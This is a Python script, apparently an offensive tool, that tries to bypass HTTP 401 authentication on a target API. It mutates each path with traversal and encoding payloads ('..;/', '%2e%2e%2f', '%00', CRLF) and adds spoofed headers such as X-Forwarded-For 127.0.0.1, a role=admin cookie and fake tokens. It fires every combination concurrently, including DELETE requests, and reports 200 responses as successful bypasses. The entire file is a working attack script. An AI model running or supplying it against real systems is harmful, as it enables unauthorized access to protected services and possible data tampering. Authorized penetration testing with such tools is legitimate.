import requests
import random
import argparse
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
from itertools import combinations
import aiohttp
import asyncio
import time

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Extended headers
auth_headers = [
    {"Authorization": "Bearer test"},
    {"Authorization": "Basic Og=="},
    {"X-Api-Key": "test"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Cookie": "role=admin"},
    {"X-Method-Override": "GET"},
    # New headers
    {"X-Custom-Auth": "true"},
    {"Debug": "true"},
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.68.0",
    "python-requests/2.28.1",
    "PostmanRuntime/7.32.2"
]

bypass_payloads = [
    "", "/", ".", "/*", ";", ";/", ";.css", "%00", "%20", "%2f", "%3f", "%23", "%26",
    "%F3%A0%81%A9", "../", "..;/", ".json", "//", "/..;/", "/./", "/../", "/?", "??",
    "%2e%2e%2f", "%2e%2e/", "%2f", "%2e/", "%3b",
    # New payloads
    "%E2%80%A8", "%0d%0a", "/%2e%2e%2f%2e%2e%2f", "/%252e%252e%252f"
]

query_params = [
    "?debug=true",
    "?access=admin",
    "?bypass=true",
    "?role=admin"
]

def generate_all_variants(base_path):
    base_path = base_path.strip()
    if not base_path.startswith("/"):
        base_path = "/" + base_path
    segments = base_path.strip("/").split("/")
    variants = {base_path}

    # Suffix payloads
    for payload in bypass_payloads:
        variants.add(base_path + payload)

    # Prefix payloads
    for payload in bypass_payloads:
        variants.add(f"/{payload}" + base_path)

    # In-between segment injection
    for i in range(1, len(segments)):
        left = "/" + "/".join(segments[:i])
        right = "/".join(segments[i:])
        for payload in bypass_payloads:
            injected = f"{left}{payload}/{right}"
            variants.add(injected)

    # Add query parameter variants
    for param in query_params:
        variants.add(base_path + param)

    return list(variants)

async def test_single_path(session, method, full_url, headers):
    try:
        if method == "GET":
            async with session.get(full_url, headers=headers, timeout=6, ssl=False) as r:
                status = r.status
                text = await r.text()
        else:
            dummy_payload = {"test": "value"}
            async with session.post(full_url, headers=headers, json=dummy_payload, timeout=6, ssl=False) as r:
                status = r.status
                text = await r.text()

        return {
            "method": method,
            "url": full_url,
            "headers": headers,
            "status": status,
            "length": len(text)
        }
    except Exception as e:
        return {
            "method": method,
            "url": full_url,
            "headers": headers,
            "status": "ERROR",
            "error": str(e)
        }

async def test_paths_async(base_uri, path_list, max_workers=10):
    success_log = []
    methods = ["GET", "POST", "PUT", "DELETE"]  # Expanded methods

    # Generate all header combinations (single and pairs)
    header_combinations = []
    for h in auth_headers:
        header_combinations.append(h)
    for h1, h2 in combinations(auth_headers, 2):
        combined = {**h1, **h2}
        header_combinations.append(combined)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for raw_path in path_list:
            path_variants = generate_all_variants(raw_path)
            for path in path_variants:
                full_url = f"https://{base_uri}{path}"
                for method in methods:
                    for headers in header_combinations:
                        headers = headers.copy()
                        headers["User-Agent"] = random.choice(user_agents)
                        tasks.append(test_single_path(session, method, full_url, headers))

        # Run tasks concurrently
        for i in range(0, len(tasks), max_workers):
            batch = tasks[i:i + max_workers]
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if result["status"] == 200:
                    success_log.append(result)
                    print(f"  âœ… 200 OK via {result['method']} | {result['url']}")
                    print(f"     âž¤ Bypass Headers: {result['headers']}")
                elif result["status"] != "ERROR":
                    print(f"  {result['status']} | {result['method']} | {result['url']}")
                else:
                    print(f"  ERROR | {result['method']} | {result['url']} | {result['error']}")

    print("\n=== âœ… SUCCESSFUL BYPASSES ===")
    for s in success_log:
        print(f"[{s['method']}] {s['url']}")
        print(f"     Headers: {s['headers']}")
        print(f"     Response Length: {s['length']}")
        print("-" * 60)

def main():
    parser = argparse.ArgumentParser(description="ðŸ”¥ Advanced API 401 Bypass Tester (Async)")
    parser.add_argument("uri", help="Base URI (e.g., api.target.com)")
    parser.add_argument("path_file", help="Path list .txt file")
    parser.add_argument("--workers", type=int, default=10, help="Max concurrent workers")
    args = parser.parse_args()

    with open(args.path_file, "r") as f:
        paths = f.readlines()

    # Run async tests
    asyncio.run(test_paths_async(args.uri, paths, args.workers))

if __name__ == "__main__":
    main()
